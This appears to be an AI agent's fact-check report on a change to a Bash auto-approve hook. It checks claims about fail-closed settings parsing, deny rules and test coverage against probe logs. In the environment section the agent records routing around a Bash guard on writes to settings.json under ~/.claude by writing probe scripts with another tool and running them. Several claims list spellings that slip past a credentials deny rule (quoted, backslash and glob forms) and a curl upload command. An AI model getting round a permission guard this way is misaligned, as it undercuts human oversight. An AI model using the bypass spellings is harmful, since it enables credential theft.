Commit: 73698a91

# Code Fact-Check Report

**Repository:** /workspace/.claude/wt-q092 (branch `fix/q092-drop-hook-deny-reader`)
**Scope:** Q-092 unit 2, the full unit against its base (unit 1, `fix/q092a-drop-deny-option` at 5ba83a3a): `git diff fix/q092a-drop-deny-option 73698a91 -- ':(exclude)docs/reviews'` (6 files: `docs/decisions/log.md`, `guides/bare-host-hook-wiring.md`, `hooks/auto-approve-allowed-commands.sh`, `hooks/wiring.json`, `test/auto-approve-allowed-commands.bats`, `test/link-claude-home-wiring.bats`), plus the commit messages from `git log fix/q092a-drop-deny-option..73698a91` (non-merge ed06dec1, fdae7834, 0444b1ac, and 72b8c825, which is a two-parent merge carrying a fix message, so it is included). Final confirming pass, no `--loop-pass`.
**Checked:** 2026-10-15
**Commit:** 73698a91
**Replication:** k=3
**Total claims checked:** 38
**Summary:** 32 verified, 2 mostly accurate, 1 stale, 0 incorrect, 3 unverifiable

Environment: jq-1.6, GNU bash 5.2.15, Claude Code 2.1.300 in the container (not run). Captured output for every executed claim is under `L=/home/node/.claude/jobs/00bcf178/tmp/q092/agents/code-fact-check-report-q092b-final-r1/` (the preamble allows edits only to this report, so the logs stay in the agent temp dir rather than `docs/reviews/execution-logs/`). A Bash guard blocks shell writes to any path naming `settings.json` under `~/.claude`, so the probes are scripts written with the Write tool and run as `bash $L/<probe>.sh`. Every probe ran in the foreground under `timeout`; no background processes were started.

Suite runs: `cd /workspace/.claude/wt-q092 && timeout 600 bats test/auto-approve-allowed-commands.bats` → exit 0, 35/35 ok, 2026-10-15T12:25:02Z (`$L/bats-full.log`). `timeout 600 bats test/link-claude-home-wiring.bats` → exit 0, 16/16 ok, 2026-10-15T12:32:50Z (`$L/bats-link.log`).

Hallucination-pattern log read (`docs/reviews/hallucination-patterns.md`). The logged class nearest to this unit is "a specific measured value quoted from an artifact set that does not contain it". Claim 32's 409 was checked against that pattern and does not match: it recomputes exactly (see Claim 32).

---

## Claim 1: "the deny reader, `--deny` and the de-quoted matching are removed. The hook emits only `allow` or nothing (never `ask`, the decision #39344 shows overriding deny; a test pins its stdout), so each deny rule now has one interpreter, Claude Code's."

**Location:** `docs/decisions/log.md:76` (row 53, 2026-10-15 amendment)
**Type:** Behavioral / Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the removal of `DENY_GLOBS`/`add_deny_rule`/`matches_deny` (this unit) and of `--deny`/de-quoting (unit 1), the hook's stdout over main's exit paths, and the stdout test's existence. It does not establish Claude Code's own matcher behaviour (Claim 3b) or the exit status on malformed hook input (Claim 10b).

No symbol of the deny reader survives (paraphrased, no quote available because the claim is about absence: `rg -n 'RULE_LEGACY|DENY_GLOBS|DENY_ALL|matches_deny|add_deny_rule|settings_rules_jq' hooks test guides devcontainer-config scripts` printed nothing). The only decision the hook prints:

```bash
# hooks/auto-approve-allowed-commands.sh:366-371
  if $all_allowed; then
    debug "Decision: ALLOW (all commands passed)"
    echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow"}}'
  else
    debug "Decision: BLOCK (falling through to normal permission check)"
  fi
```
(excerpt ends :371; enclosing `main()` continues to :374 with `exit 0`, read.) Probe 2 fed 11 hook inputs covering every main exit. Stdout was empty or exactly the allow JSON each time (`$L/probe2.log`). The `--deny` test at `test/auto-approve-allowed-commands.bats:184-188` passes. The stdout test is Claim 24.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:278-374`; command `timeout 600 bash $L/probe2.sh`, cwd `/workspace/.claude/wt-q092`, exit 0, 2026-10-15T12:26:43Z; `$L/probe2.log`, `$L/bats-full.log`

---

## Claim 2: "The hook still fails closed on an unreadable or ill-shaped settings file, now also when `permissions` is present but not an object, or `permissions.allow`, `.deny` or `.ask` is present but not an array or holds a string with a NUL (non-string entries are skipped …)."

**Location:** `docs/decisions/log.md:76`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook-side behaviour for every shape named in the brief (permissions absent/null/[]/{}/string/false/0; allow/deny/ask absent, null, false, string, object, `[5]`, `["x\u0000y"]`), a mode-000 file and a directory at the path. The parenthetical's reason ("as Claude Code drops them with a warning") is Claim 15b.

The program that enforces it:

```jq
# hooks/auto-approve-allowed-commands.sh:157-168
| if type != "object" then error("settings file is not a JSON object") else . end
| if has("permissions") then .permissions else empty end
| if type != "object" then error("permissions is not an object")
  else
    (["allow", "deny", "ask"][] as $k | select(has($k)) | .[$k]
     | if type != "array" then error("permissions.\($k) is not an array")
       elif any(.[]; type == "string" and test("\u0000"))
         then error("NUL inside a permissions.\($k) rule")
       else empty end),
    ((.allow // [])[] | select(type == "string"))
  end
| . + "\u0000"
```
Probe 3 put the allow rule in the project file and varied the global file, so a refusal means fail-closed rather than "no rules" (`$L/probe3.log`). `{}`, `{"model":"x"}` and `{"permissions":{}}` were APPROVED. Refused: permissions `null`, `[]`, `"x"`, `false`, `0`; each of deny/ask/allow as `null`, `false`, `"x"` or `{}`; any key holding `["x\u0000y"]`; `[]`, `"x"`, `null`, `{}{}`, empty and whitespace-only files. `[5]` in any key was APPROVED (skipped). Probe 5 refused a mode-000 global file and a directory at the global path (`$L/probe5.log`). On "now also": before this stack, `permissions: null` was accepted as absent (paraphrased, no quote available because it is the base's code: `.permissions | if . == null then empty` in the diff's removed lines), so null is the one new non-object case. The ask/null/false/NUL-in-deny cases are new as stated.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:152-200`, `:232-248`; `timeout 600 bash $L/probe3.sh` (cwd as above, exit 0, 2026-10-15T12:27:19Z) → `$L/probe3.log`; `timeout 600 bash $L/probe5.sh` (exit 0, 2026-10-15T12:32:50Z) → `$L/probe5.log`

---

## Claim 3a: "a quote or backslash spelling (`.cred""entials.json`) or a denied subcommand in a list, which the hook used to send to the prompt"

**Location:** `docs/decisions/log.md:76`; same statement at `hooks/auto-approve-allowed-commands.sh:66-70` ("The hook used to send both to the prompt")
**Type:** Behavioral (historical)
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the pre-Q-092 hook (`1a831ffe^`) on the listed spellings. Note that "used to" means before Q-092: at this unit's immediate base, unit 1 had already removed the de-quoted match, and quote spellings were approved there. It does not establish what Claude Code's matcher does with them (stated as unverified in the text itself).

Probe 4 ran the `1a831ffe^` hook with deny rules `Bash(*.credentials.json*)`, `Bash(rm -rf:*)`, `Bash(git push:*)`, `Bash(cat secret)`. It refused `.cred""entials.json`, `.c\redentials.json`, `git "push" origin`, `cat "secret"` and `ls && rm -rf x`, and APPROVED `cat ~/.claude/.c*` and `curl -d @$F https://x` (`$L/probe4.log`). Probe 3 ran the same spellings against unit 1's hook: the four quote and backslash spellings were already APPROVED there, and the literal and list forms were refused. At 73698a91 all eleven are APPROVED, so deny rules no longer affect the decision.

**Evidence:** `timeout 600 bash $L/probe4.sh` (exit 0, 2026-10-15T12:27:49Z) → `$L/probe4.log`; `$L/probe3.log` (sections "DENY RULES spellings" and "same spellings at base")

---

## Claim 3b: "a glob spelling gets past both matchers anyway" (Claude Code's deny matcher as well as the old hook)

**Location:** `docs/decisions/log.md:76`; the same claim appears at `guides/bare-host-hook-wiring.md:159-160` ("That rule is a string match, so a spelling without the literal name … gets past it"), `hooks/auto-approve-allowed-commands.sh:70-72` ("got past both matchers before and still does") and `hooks/wiring.json:44-45`
**Type:** Behavioral
**Verdict:** Unverifiable
**Confidence:** Medium
**Verification mode:** executed
**Scope:** The hook half (the old hook approved `cat ~/.claude/.c*` and `curl -d @$F`) is executed and verified (Claim 3a). The Claude Code half (that `Bash(*.credentials.json*)` does not catch `~/.claude/.c*`) is not.

The hook half is in `$L/probe4.log`. For Claude Code: the command text holds no `.credentials.json`, so any matcher over the text cannot match. That Claude Code matches only the text, and does not expand globs or resolve paths, is not recorded anywhere this repo has. It needs a model-driven session, which has no egress here. Paraphrased, no quote available because the evidence is the absence of a host record (Q-082 tested only the literal canary spelling). The preamble lists this as known and accepted.

**Evidence:** `$L/probe4.log`; `docs/working/questions-archive.md` (`### Q-082`, the canary test uses the literal spelling only)

---

## Claim 4a: "the hook still approves from its allow rules" when a settings file holds an invalid value the hook does not check (header: "anything Claude Code rejects that this check accepts (another key's value, a BOM, jq-only literals such as NaN)")

**Location:** `docs/decisions/log.md:76` ("New residual"); `hooks/auto-approve-allowed-commands.sh:81-85` (RESIDUAL)
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers what the hook accepts: another key's odd value, a UTF-8 BOM, NaN/Infinity literals on jq 1.6. It does not establish that Claude Code rejects any of them (Claim 4b).

APPROVED: `{"permissions":{"allow":["Bash(ls:*)"]},"other":NaN}` (`$L/probe1.log`), `{"permissions":{"defaultMode":"x","additionalDirectories":5}}` (`$L/probe3.log`), and a file starting `\xef\xbb\xbf` (`$L/probe6.log`). jq 1.6 accepts `NaN`, `nan`, `Infinity`, `infinity` and `-Infinity` (`$L/bench.log`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:152-169`; `timeout 600 bash $L/probe1.sh` (exit 0, 2026-10-15T12:26:26Z) → `$L/probe1.log`; `timeout 600 bash $L/probe6.sh` (exit 0, 2026-10-15T12:33:42Z) → `$L/probe6.log`; `$L/bench.log`

---

## Claim 4b: "Claude Code can ignore a whole settings file for an invalid value the hook does not check, dropping its deny rules"

**Location:** `docs/decisions/log.md:76`; `hooks/auto-approve-allowed-commands.sh:78-80`, `:81-84`
**Type:** Behavioral (Claude Code)
**Verdict:** Unverifiable
**Confidence:** Low
**Verification mode:** static
**Scope:** A claim about Claude Code's settings validator. Neither which values cause a whole-file drop nor that one happens was traced or run.

Commit 72b8c825 itself says "which values make Claude Code drop a file was not traced". Verifying it needs Claude Code's validator traced in the 2.1.300 binary, or a host session with a bad-valued settings file. Paraphrased, no quote available because the subject is outside the repo.

**Evidence:** commit 72b8c825 message (Notes); `hooks/auto-approve-allowed-commands.sh:78-85`

---

## Claim 5: "Q-082 did not record its Claude Code version and the image installs `@latest`; the hook header's ROLE gives the re-test trigger, and its DENY RULES ARE CLAUDE CODE'S and FAILS CLOSED sections replace WHAT THE DENY CHECK GUARANTEES. Plan and bypass-family table: `docs/working/plan-q092-drop-hook-deny-reader.md`."

**Location:** `docs/decisions/log.md:76`
**Type:** Reference / Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the Q-082 record, the image's version pin, the header sections and the plan file's existence. It does not establish the plan's content (out of scope).

The Q-082 entry in `docs/working/questions-archive.md` names no Claude Code version: a grep of the section for `version|2\.1\.` matched only lines from the following Q-091 entry. `devcontainer-config/Dockerfile:19` `ARG CLAUDE_CODE_VERSION=latest`, `:403` `RUN npm install -g @anthropic-ai/claude-code@${CLAUDE_CODE_VERSION}`, and `devcontainer-config/devcontainer.json:29` `"CLAUDE_CODE_VERSION": "latest",`. The header holds ROLE (`:50-61`, with "re-run Q-082's test when …" at `:57-59`), DENY RULES ARE CLAUDE CODE'S (`:63`) and FAILS CLOSED (`:74`), and `WHAT THE DENY CHECK` occurs nowhere outside the decision log (paraphrased, no quote available because it is an absence result from `rg -l`). The plan file exists (94 lines).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:50-85`; `devcontainer-config/Dockerfile:19,403`; `devcontainer-config/devcontainer.json:29`; `docs/working/plan-q092-drop-hook-deny-reader.md`

---

## Claim 6: "The sandbox half of Q-070 [1] is not built: it needs image and runArgs changes that are open as a follow-up question (Q-081)."

**Location:** `docs/decisions/log.md:76` (last sentence of the 2026-10-15 amendment)
**Type:** Reference / Staleness
**Verdict:** Stale
**Confidence:** High
**Verification mode:** static
**Scope:** "Not built" is true on this branch. The pointer "open as a follow-up question (Q-081)" is stale. This sentence was carried over from the 2026-09-28 amendment, but this unit moved it under the 2026-10-15 amendment, where it reads as current.

Q-081 is closed: `### Q-081 · cc-isolated-sandbox-half` · `**Status:** ANSWERED`, "**Answered 2026-09-28: [2] spike `enableWeakerNestedSandbox` first.** Filed as Q-088". The open work is `### Q-125 · build-cc-isolated-sandbox` (`**Status:** OPEN`), built but unmerged on `feat/q125a-seccomp` and `feat/q125-cc-isolated-sandbox`. "Not built" holds: `grep -c -i bubblewrap devcontainer-config/Dockerfile` → 0. The hook header already cites the right pair: `cc-isolated has no sandbox (Q-081, Q-125)` (`hooks/auto-approve-allowed-commands.sh:59`). The accurate pointer would name Q-125 (built, unmerged).

**Evidence:** `docs/working/questions-archive.md` (`### Q-081`), `docs/working/questions.md` (`### Q-125`); `devcontainer-config/Dockerfile`; `hooks/auto-approve-allowed-commands.sh:59`

---

## Claim 7: "It emits only `allow` or nothing, and it does not read deny rules: Claude Code applies `permissions.deny` even after a hook `allow` (host test Q-082), so the credentials backstop is the `Bash(*.credentials.json*)` deny rule alone where no sandbox runs (cc-isolated has none)."

**Location:** `guides/bare-host-hook-wiring.md:156-159`
**Type:** Behavioral / Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's output and its not reading deny rules (Claims 1, 25), the Q-082 record, and the rule's presence in the wiring. "Alone" is checked against the Bash path only. The Read() rule and the guard hook cover other paths.

Q-082 records: "`cat x.q082-canary` was **denied**", with a hook that always returned allow, and the user confirmed `/hooks` listed it (questions-archive `### Q-082`). `hooks/wiring.json:133` holds `"Bash(*.credentials.json*)",`. Probe 3 shows deny rules no longer affect the hook's decision.

**Evidence:** `docs/working/questions-archive.md` (`### Q-082`); `hooks/wiring.json:133`; `$L/probe3.log`

---

## Claim 8: "The hook header's DENY RULES ARE CLAUDE CODE'S and RULE SYNTAX sections say what is left."

**Location:** `guides/bare-host-hook-wiring.md:160-161`
**Type:** Reference
**Verdict:** Mostly accurate
**Confidence:** Medium
**Verification mode:** static
**Scope:** Both sections exist. The sentence follows a statement about gaps in the credentials backstop, and RULE SYNTAX no longer says anything about deny matching or that backstop. It does not establish that a reader following the pointer to RULE SYNTAX would find anything about "what is left" of the deny protection.

DENY RULES ARE CLAUDE CODE'S lists the unverified and accepted spellings (`hooks/auto-approve-allowed-commands.sh:63-72`). RULE SYNTAX now covers allow rules only: `An allow rule is a literal command prefix:` (`:97`), and its table has no deny column (`:98-104`). Before this unit it held the "as deny" column, which is why the pointer named it. A tighter pointer: "DENY RULES ARE CLAUDE CODE'S says what is left; RULE SYNTAX says what an allow rule approves."

**Evidence:** `hooks/auto-approve-allowed-commands.sh:63-72,95-104`; `guides/bare-host-hook-wiring.md:156-161`

---

## Claim 9: "Dynamically reads allow rules from (SETTINGS SOURCES below)" and "`--permissions JSON` Use custom permissions instead of reading from settings files"

**Location:** `hooks/auto-approve-allowed-commands.sh:4`, `:15`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers `load_rules`' two branches. It does not cover what `--permissions` accepts (unchanged in this unit).

```bash
# hooks/auto-approve-allowed-commands.sh:235-247
  if [[ -n "$CUSTOM_PERMISSIONS" ]]; then
    ...
    mapfile -d '' records < <(printf '%s' "$CUSTOM_PERMISSIONS" \
      | jq -j '.[]? | select(type == "string" and (explode | any(. == 0) | not)) | . + "\u0000"' 2>/dev/null)
  else
    mapfile -d '' records < <(read_settings_rules)
    ...
  fi
  for rec in "${records[@]}"; do add_allow_rule "$rec"; done
```
(excerpt elides :236-237 and :242-245; enclosing `load_rules` spans :232-248, read.) Only allow records are emitted (`:166`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:4,15,152-169,232-248`

---

## Claim 10a: "The hook emits one decision, "allow", or nothing … It never emits "ask", "deny" or "defer"."

**Location:** `hooks/auto-approve-allowed-commands.sh:50-52`
**Type:** Invariant
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers stdout on every main exit (jq missing, empty command, no prefixes, parse failure, shape refusal, no commands extracted, unlisted, approved, set -e abort on malformed input) and the source's one decision string. Exit status is Claim 10b.

`grep -o '"permissionDecision":"[a-z]*"' hooks/auto-approve-allowed-commands.sh | sort -u` gives only the allow string (the stdout test's static line). Probe 2: all 11 inputs printed empty stdout or exactly the allow JSON, and the jq-missing run (PATH without jq) exited 0 with empty stdout (`$L/probe2.log`). Mutants M1a-M1e put ask/deny/defer on five different exits, three of them spelled through `printf %s` so the static grep misses them. All five were caught by the stdout test (Claim 24).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:278-374`; `$L/probe2.log`; `$L/mutants3.log`

---

## Claim 10b: "or nothing (exit 0 with no output, so Claude Code's own rules and prompt decide)"

**Location:** `hooks/auto-approve-allowed-commands.sh:51-52`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** True on every path Claude Code can reach, since it always sends a JSON object with `tool_input`. It does not hold for malformed hook input, where the hook exits non-zero (4 or 5, never 2 in these probes) with empty stdout.

Under `set -euo pipefail` (`:106`), `command=$(echo "$input" | jq -r '.tool_input.command // empty')` (`:305`) aborts main when jq fails. Probe 2: input `not json` → `exit=4 out=[]`, and `{"tool_input":"x"}` → `exit=5 out=[]` (`$L/probe2.log`). Stdout stays empty and the status is not 2, so the effect is still "nothing", a non-blocking hook error. A precise version: "or nothing (no output; exit 0 on every input Claude Code sends)".

**Evidence:** `hooks/auto-approve-allowed-commands.sh:106,302-313`; `timeout 600 bash $L/probe2.sh` (exit 0, 2026-10-15T12:26:43Z) → `$L/probe2.log`

---

## Claim 11: "a hook "ask" overrides permissions.deny (Claude Code issue #39344), but a hook "allow" does not (host test Q-082, 2026-09-28; decision log row 53). Q-082 did not record the Claude Code version (Q-091 saw 2.1.284 on the host that day) and the image installs @latest"

**Location:** `hooks/auto-approve-allowed-commands.sh:53-57`
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the repo's records of Q-082 and Q-091 and the image pin. Issue #39344's content is taken as this repo records it (no egress).

Q-091's answer: "The user ran `rm ~/claude-workflows/.git/commondir && claude --version` … it printed `2.1.284 (Claude Code)`" ("**Answer (2026-09-28): [1].**"), run on the host. That Q-082 records no version is from Claim 5. @latest: `devcontainer-config/Dockerfile:19`.

**Evidence:** `docs/working/questions-archive.md` (`### Q-082`, `### Q-091`); `devcontainer-config/Dockerfile:19,403`

---

## Claim 12: "cc-isolated has no sandbox (Q-081, Q-125), so there the shape allowlist above still decides which allow-listed commands run without a prompt."

**Location:** `hooks/auto-approve-allowed-commands.sh:59-61`
**Type:** Reference / Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers this branch's Dockerfile (no bubblewrap) and the Q-125 status (open, unmerged). It does not cover a host where Q-125's branch was installed by hand.

`grep -c -i bubblewrap devcontainer-config/Dockerfile` → 0, and Q-125 is `**Status:** OPEN`, its units still on unmerged branches.

**Evidence:** `devcontainer-config/Dockerfile`; `docs/working/questions.md` (`### Q-125`)

---

## Claim 13: "The hook used to read Bash deny rules itself and never approve a match, raw or de-quoted. Q-082 made that redundant for "allow", so it is gone and each deny rule has one interpreter."

**Location:** `hooks/auto-approve-allowed-commands.sh:63-65`
**Type:** Behavioral (historical)
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the pre-Q-092 hook (raw and de-quoted refusals) and the present one (no deny reading). Q-082's scope is in Claim 7.

Pre-Q-092 hook: literal and de-quoted spellings refused (`$L/probe4.log`). Now: the same spellings with the same deny rules are approved (`$L/probe3.log`). The reader's symbols are gone (Claim 1).

**Evidence:** `$L/probe4.log`, `$L/probe3.log`

---

## Claim 14: "FAILS CLOSED on its inputs: if any settings file below exists but cannot be read, does not hold exactly one JSON object, or has a permissions that is not an object, or a permissions.allow, .deny or .ask (present at all) that is not an array or holds a string with a NUL, no command is approved on that call. deny and ask are shape-checked, never read"

**Location:** `hooks/auto-approve-allowed-commands.sh:74-78`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers each listed condition, with a good file elsewhere supplying the allow rule, and "never read" (deny/ask contents do not affect approval). The "Claude Code can ignore a whole settings file" premise is Claim 4b.

All conditions refused as listed (Claim 2, `$L/probe3.log`, `$L/probe5.log`). "Never read": the deny/ask contents feed only `error(...)`/`empty` (`:161-165`), and only `.allow` is emitted (`:166`). Mutants M3a-M3f, M4a-M4d (Claims 26, 28) show the tests pin each condition.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:152-169`; `$L/probe3.log`, `$L/probe5.log`

---

## Claim 15a: "Non-string entries are skipped, not refused" (hook behaviour)

**Location:** `hooks/auto-approve-allowed-commands.sh:80`; `:148`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers non-string entries in allow, deny and ask (number, null, bool, object, array). The NUL check applies only to direct string entries, so a nested `[["x\u0000y"]]` is skipped like any non-string. The Claude Code half is Claim 15b.

`any(.[]; type == "string" and test("\u0000"))` (`:163`) and `select(type == "string")` (`:166`). APPROVED: `allow:[5,"Bash(ls:*)"]`, `allow:[null,true,{},[],"Bash(ls:*)"]`, `deny:[5]`, `ask:[5]`, `deny:[null,true,{},[1]]` and `deny:[["x\u0000y"]]` (`$L/probe1.log`, `$L/probe3.log`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:161-166`; `$L/probe1.log`, `$L/probe3.log`

---

## Claim 15b: "Claude Code drops those with a warning and keeps the file."

**Location:** `hooks/auto-approve-allowed-commands.sh:80-81`; `:148`; `docs/decisions/log.md:76`; `test/auto-approve-allowed-commands.bats:220` (title); commit 0444b1ac
**Type:** Behavioral (Claude Code)
**Verdict:** Unverifiable
**Confidence:** Low
**Verification mode:** static
**Scope:** A claim about Claude Code 2.1.300's settings loader. Commit 0444b1ac says it was "read from the 2.1.300 binary, not run". This pass did not reproduce that reading.

A grep of the 2.1.300 binary for non-string or invalid-rule messages found nothing on point (paraphrased, no quote available because the binary is minified and the grep found nothing relevant). Verifying it needs the loader traced in the binary or a host session with `allow:[5,…]` that checks both the warning and that the file's other rules still apply.

**Evidence:** commit 0444b1ac message (Notes); `/usr/local/share/npm-global/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe`

---

## Claim 16: "SETTINGS SOURCES. ${CLAUDE_CONFIG_DIR:-$HOME/.claude}/settings.json, resolved like devcontainer-config/link-claude-home.sh's DEST (an empty value falls back; a relative value approves nothing), then <git root>/.claude/settings.json and settings.local.json (the cwd's .claude/ outside a repo). One jq call reads all of them (SETTINGS_RULES_JQ). --permissions replaces all three. Managed settings and --settings files are not read"

**Location:** `hooks/auto-approve-allowed-commands.sh:87-93`
**Type:** Configuration / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the file list, the linker's DEST expression, and the relative/empty CLAUDE_CONFIG_DIR handling (bats). It does not establish which files Claude Code itself reads.

```bash
# hooks/auto-approve-allowed-commands.sh:133-138
settings_files() {
  local root
  root=$(git rev-parse --show-toplevel 2>/dev/null) || root=""
  printf '%s\0' "${CLAUDE_CONFIG_DIR:-$HOME/.claude}/settings.json" \
    "${root:-.}/.claude/settings.json" "${root:-.}/.claude/settings.local.json"
}
```
`devcontainer-config/link-claude-home.sh:36` `DEST="${CLAUDE_CONFIG_DIR:-$HOME/.claude}"`. One call: `jq -nj "$SETTINGS_RULES_JQ" "${files[@]}" --args "${files[@]}"` (`:199`). The CLAUDE_CONFIG_DIR tests at bats `:237`, `:257`, `:269` pass.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:133-200,232-248`; `devcontainer-config/link-claude-home.sh:36`; `$L/bats-full.log`

---

## Claim 17: RULE SYNTAX: "parse_bash_rule reads `Bash(BODY)`, with a trailing legacy `:*` stripped from BODY, or a bare `Bash`; anything else (another tool, no closing paren) is not a Bash rule" plus the table rows, including "`Bash(ls *)` literal prefix, not a glob: `ls *` and `ls * -la` (bash then expands that `*`), never `ls -la` (use `Bash(ls:*)`)"

**Location:** `hooks/auto-approve-allowed-commands.sh:95-104`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers every table row and the parser after `RULE_LEGACY` was removed (only one trailing `:*` is stripped). It does not establish Claude Code's reading of the same rules.

```bash
# hooks/auto-approve-allowed-commands.sh:205-217
parse_bash_rule() {
  local rule="$1"
  RULE_BARE=false RULE_BODY=""
  if [[ "$rule" == "Bash" ]]; then
    RULE_BARE=true
    return 0
  fi
  [[ "$rule" == "Bash("*")" ]] || return 1
  RULE_BODY=${rule#Bash\(}
  RULE_BODY=${RULE_BODY%\)}
  RULE_BODY=${RULE_BODY%:\*}
  return 0
}
```
Probe 3 (`--permissions`): `Bash(ls *)` refused `ls -la` and approved `ls * -la` and `ls *`. `Bash(ls:*)` approved `ls` and refused `lsx`. Refused: bare `Bash`, `Bash(ls:*` (no closing paren), `Read(ls)`, `ls/x` under `Bash(ls)`. Approved: `a/b/x` under `Bash(a/b)` and `python3 d/x` under `Bash(python3 d)`. `Bash(ls:*:*)` strips one `:*` and refused `ls -la`. Nothing still references `RULE_LEGACY` (Claim 1).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:205-225,253-276`; `$L/probe3.log`; bats `:310-336` pass

---

## Claim 18: jq-program comments: "Left empty when a settings file could not be read, so the hook then approves nothing"; "permissions.allow, .deny and .ask, when present (even as null or false), must each be an array, and no string in them may hold a NUL"; "test("\u0000"), not contains(): jq 1.6's contains() matches a NUL needle against every string."

**Location:** `hooks/auto-approve-allowed-commands.sh:125-126`, `:140-151`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the jq 1.6 behaviour in this container and the documented shapes. It does not cover other jq versions.

jq 1.6: `"abc" | contains("\u0000")` → `true`; `"abc" | test("\u0000")` → `false`; `"a\u0000c" | test("\u0000")` → `true` (`$L/probe1.log`). The null/false cases are refused (Claim 2). On a load failure `load_rules` returns before the loop that fills `ALLOW_PREFIXES` (`:242-245`), and main exits on an empty array (`:320-323`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:125-169,232-248,315-323`; `$L/probe1.log`

---

## Claim 19: "A relative CLAUDE_CONFIG_DIR resolves against this hook's cwd, not the linker's, so it could name some other directory's settings.json and add its allow rules: fail closed."

**Location:** `hooks/auto-approve-allowed-commands.sh:176-178`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the relative-path refusal. It does not cover symlinked absolute paths.

`if [[ -n "${CLAUDE_CONFIG_DIR:-}" && "$CLAUDE_CONFIG_DIR" != /* ]]; then … return 1` (`:179-182`). The bats test "a relative CLAUDE_CONFIG_DIR fails closed instead of reading another directory's allow rules" (`:257`) passes.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:173-200`; `$L/bats-full.log`

---

## Claim 20: "The parser for `Bash(...)` rule strings. Sets RULE_BARE … and RULE_BODY (the text inside the parens, with a trailing legacy `:*` removed). Returns 1 for anything that is not a Bash rule."

**Location:** `hooks/auto-approve-allowed-commands.sh:202-204`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the function body quoted in Claim 17. Its only caller is `add_allow_rule` (`:222`).

See the quote at `:205-217` in Claim 17. `rg -n parse_bash_rule hooks/` shows only the definition, comments and the call in `add_allow_rule` (paraphrased, no quote available because this is an absence result).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:202-225`

---

## Claim 21: "--permissions replaces the settings files (testing), and then they are not read. … On failure no rule is kept, not even the records jq printed before its error."

**Location:** `hooks/auto-approve-allowed-commands.sh:227-231`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers one good file followed by one bad file. jq printed the good file's rule, then errored, and the hook loaded 0 prefixes.

Probe 1, with a good project settings.json and a bad settings.local.json: raw jq printed `Bash(ls:*)\0`, then `jq: error … permissions.deny is not an array`, rc=5. The hook printed `[DEBUG] A settings file could not be read or parsed: approving nothing` and `[DEBUG] Loaded 0 allowed prefixes`. With the bad file removed, the control approved (`$L/probe1.log`). The early `return 0` (`:242-245`) skips the `add_allow_rule` loop (`:247`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:232-248`; `$L/probe1.log`

---

## Claim 22: wiring.json `_comment`: "Claude Code applies it even after auto-approve-allowed-commands.sh says allow (host test Q-082), so that hook does not read deny rules (Q-092)."

**Location:** `hooks/wiring.json:42-44`
**Type:** Reference / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the Q-082 record (any always-allow hook against a Bash deny rule, so it applies to this hook) and the hook not reading deny rules. The "string match … gets past it" sentence is Claim 3b. The historical "ran with no prompt" sentence (`:41-42`) is past tense and was not re-run.

Q-082 is in Claim 7, and the absence of a deny reader in Claims 1 and 13.

**Evidence:** `hooks/wiring.json:39-46`; `docs/working/questions-archive.md` (`### Q-082`)

---

## Claim 23: "A hook "allow" does not override permissions.deny (host test Q-082), and the hook never emits "ask", the decision that does (Claude Code #39344). So it no longer reads deny rules: Claude Code applies them after the hook says "allow"."

**Location:** `test/auto-approve-allowed-commands.bats:114-117`
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Same evidence as Claims 7 and 10a.

**Evidence:** `test/auto-approve-allowed-commands.bats:114-117`; Claims 7, 10a

---

## Claim 24: Test "the hook's stdout is empty or exactly the allow decision: never ask, deny or defer"; its comment: "Stdout alone (stderr dropped), over main's exit paths for approved, refused, unparseable, unlisted, empty and malformed input (the jq-missing exit is not reached). Statically: the source spells exactly one decision."

**Location:** `test/auto-approve-allowed-commands.bats:147-170`
**Type:** Behavioral (test)
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
